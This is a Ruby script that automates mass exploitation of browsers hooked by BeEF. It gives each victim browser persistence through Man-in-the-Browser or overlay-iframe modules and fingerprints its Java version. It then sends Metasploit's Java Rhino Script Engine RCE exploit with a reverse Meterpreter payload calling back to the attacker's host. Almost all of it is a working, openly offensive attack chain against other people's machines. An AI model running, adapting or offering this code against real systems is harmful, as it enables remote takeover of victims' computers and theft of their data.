Screencast [here](http://vimeo.com/41644329)

```ruby
#
#   Copyright 2012 Michele Orru michele.orru@antisnatchor.com
#
#   Licensed under the Apache License, Version 2.0 (the "License");
#   you may not use this file except in compliance with the License.
#   You may obtain a copy of the License at
#
#       http://www.apache.org/licenses/LICENSE-2.0
#
#   Unless required by applicable law or agreed to in writing, software
#   distributed under the License is distributed on an "AS IS" BASIS,
#   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
#   See the License for the specific language governing permissions and
#   limitations under the License.
#
# Java 1.6.0u27 mass-pwner
# - run metasploit (./msfconsole -r ../BeEF.rc)
# - get browser plugins
# - get OS type and browser type/version
# - in order to achieve persistence:
#   - if the hooked browser is IE launch the iFrame above,
#   - otherwise MitB
# - launch get_system_info if java version is not exposed by plugins
# - retrieve exact version of the JDK
# - if JDK is vulnerable -> launch Rhino RCE exploit (reverse Java meterpreter)
require 'rest_client'
require 'json'

# RESTful API root endpoints
ATTACK_DOMAIN = "192.168.0.40"
RESTAPI_HOOKS = "http://" + ATTACK_DOMAIN + ":3000/api/hooks"
RESTAPI_LOGS = "http://" + ATTACK_DOMAIN + ":3000/api/logs"
RESTAPI_MODULES = "http://" + ATTACK_DOMAIN + ":3000/api/modules"
RESTAPI_ADMIN = "http://" + ATTACK_DOMAIN + ":3000/api/admin"

BEEF_USER = "beef"
BEEF_PASSWD = "beef"
# we also assume that BeEF and Metasploit are on the same host.
# be sure to have "host" and "callback_host" in extensions/metasploit/config.yaml
# with the same value of ATTACK_DOMAIN

@token = nil
@modules = nil
@hooks = nil
@meterpreter_lport = 10666

def print_banner
  puts "[>>>] JDK <= 1.6.0_27 mass pwner]"
  puts "[>>>] uses BeEF RESTful API to control mass zombies"
  puts "[>>>] BeEF persistence techniques used: Mitb/iframe_above"
  puts "[>>>] MSF Rhino RCE is used to pwn the host if the detected version of Java is vulnerable"
  puts "[>>>] [by AntiSnatchOr - 2012]"

end

def auth
  response = RestClient.post "#{RESTAPI_ADMIN}/login",
                             { 'username' => "#{BEEF_USER}",
                               'password' => "#{BEEF_PASSWD}"}.to_json,
                             :content_type => :json,
                             :accept => :json
  result = JSON.parse(response.body)
  @token = result['token']
  puts "[+] Retrieved RESTful API token: #{@token}"
end

def hooks
  response = RestClient.get "#{RESTAPI_HOOKS}", {:params => {:token => @token}}
  result = JSON.parse(response.body)
  @hooks = result["hooked-browsers"]["online"]
  puts "[+] Retrieved Hooked Browsers list. Online: #{@hooks.size}"
end

def modules
  response = RestClient.get "#{RESTAPI_MODULES}", {:params => {:token => @token}}
  @modules = JSON.parse(response.body)
  puts "[+] Retrieved #{@modules.size} available command modules"
end

################# HELPERS #########################
def get_module_id(mod_name)
  @modules.each do |mod|
    #normal modules
    if mod_name == mod[1]["class"]
      return mod[1]["id"]
      break
      # metasploit modules
    else if mod[1]["class"] == "Msf_module" && mod_name == mod[1]["name"]
           return mod[1]["id"]
           break
         end
    end
  end
end

def random_string(length)
  chars = 'abcdefghjkmnpqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ'
  result = ''
  length.times { result << chars[rand(chars.size)] }
  result
end
#//////////////////// HELPERS ///////////////////////#

def get_java_version(session)
  response = RestClient.get "#{RESTAPI_HOOKS}/#{session}", {:params => {:token => @token}}
  result = JSON.parse(response.body)
  java_version = nil
  if result['JavaEnabled'] == "Yes"
    puts "[+] Retrieving exact version of Java for Hooked Browser [#{session}]"
    mod_id = get_module_id("Get_system_info")
    response = RestClient.post "#{RESTAPI_MODULES}/#{session}/#{mod_id}?token=#{@token}", {}.to_json,
                               :content_type => :json,
                               :accept => :json
    result = JSON.parse(response.body)
    cmd_id = result['command_id']
    puts "[+] Get_system_info module with command id ##{cmd_id} sent."
    java_version = poll_for_command_results(session, mod_id, cmd_id).split("Java Version: ")[1]
    puts "[+] Get_system_info module with command id ##{cmd_id} executed. Java Version: #{java_version}"
  end
  java_version
end

def poll_for_command_results(session, mod, cmd_id)
  timeout = 30
  java_version = ""
  while timeout > 0 do
    begin
      response = RestClient.get "#{RESTAPI_MODULES}/#{session}/#{mod}/#{cmd_id}", {:params => {:token => @token}}
      result = JSON.parse(response.body)
      data = JSON.parse(result["data"])["data"]
      puts "[-] Cool, got results...parsing them."
      java_version = data[data.index("Java Version: "),22] # return something like "Java Version: 1.6.0_31"
      break
    rescue RestClient::ResourceNotFound  # no response yet...continue until timeout
      puts "[-]No results yet."
      timeout -= 2
      sleep 2
    end
  end
  java_version
end

def pwn_hooks_with_vuln_java
  @windows_hooks = []
  @hooks.each do |hook|
    session = hook[1]["session"]
    browser = "#{hook[1]["name"]}-#{hook[1]["version"]}"

    #The Man-in-the-Browser module is still not supported in IE, so we use the overlay iframe_above module
    if browser.match(/^IE/)
      mod_id = get_module_id("Iframe_above")
      send_iframe_above_module(session, mod_id)
      puts "[+] Hooked browser is [#{browser}]...achieving persistence with iFrame Above module..."
    else
      mod_id = get_module_id("Man_in_the_browser")
      send_mitb_module(session, mod_id)
      puts "[+] Hooked browser is [#{browser}]...achieving persistence with Man In The Browser module..."
    end

    sleep 2
    java_version = get_java_version(session)
    if java_version == nil
      puts "[--] Skipping HookedBrowser [#{browser}]. Java not enabled."
      next
    end
    if java_version == "1.6.0_27" || java_version.split("1.6.0_")[1].to_i < 27
      puts "[+] Java version [#{java_version}] IS vulnerable to Rhino Script Engine RCE exploit. Sending malicious applet..."
      mod_id = get_module_id("Java Applet Rhino Script Engine Remote Code Execution")
      send_msf_module(session, mod_id, "java/meterpreter/reverse_http")
      puts "[+] Exploit [Java Applet Rhino Script Engine RCE] sent. Check your MSFconsole :D"
    else
      puts "[+] Java version [#{java_version}] IS NOT vulnerable to Rhino Script Engine RCE exploit. Skipping Hooked Browser."
    end
  end
end

def send_mitb_module(session, mod_id)
  RestClient.post "#{RESTAPI_MODULES}/#{session}/#{mod_id}?token=#{@token}", {}.to_json,
                             :content_type => :json,
                             :accept => :json
end

def send_iframe_above_module(session, mod_id)
  RestClient.post "#{RESTAPI_MODULES}/#{session}/#{mod_id}?token=#{@token}",
                             {}.to_json,
                             :content_type => :json,
                             :accept => :json
end

def send_msf_module(session, mod_id, payload)
  RestClient.post "#{RESTAPI_MODULES}/#{session}/#{mod_id}?token=#{@token}",
                             {"SRVHOST" => "#{ATTACK_DOMAIN}",
                              "SRVPORT" => "8080",
                              "URIPATH" => random_string(10),
                              "PAYLOAD" => payload,
                              "LHOST" => "#{ATTACK_DOMAIN}",
                              "LPORT" => @meterpreter_lport
                             }.to_json,
                             :content_type => :json,
                             :accept => :json
  @meterpreter_lport += 1
  sleep 5
end

print_banner
# Retrieve the RESTful API token
auth
# Retrieve online hooked browsers
hooks
# Retrieve available modules
modules
# Filter hooked browsers selecting only those with Java Enabled, then:
# - in order to achieve persistence, if the hooked browser is IE launch the iFrame above, otherwise MitB
# - launch get_system_info module to retrieve the exact version of Java
# - if java is 1.6.0_27 or lower, launch the Rhino RCE exploit
pwn_hooks_with_vuln_java
```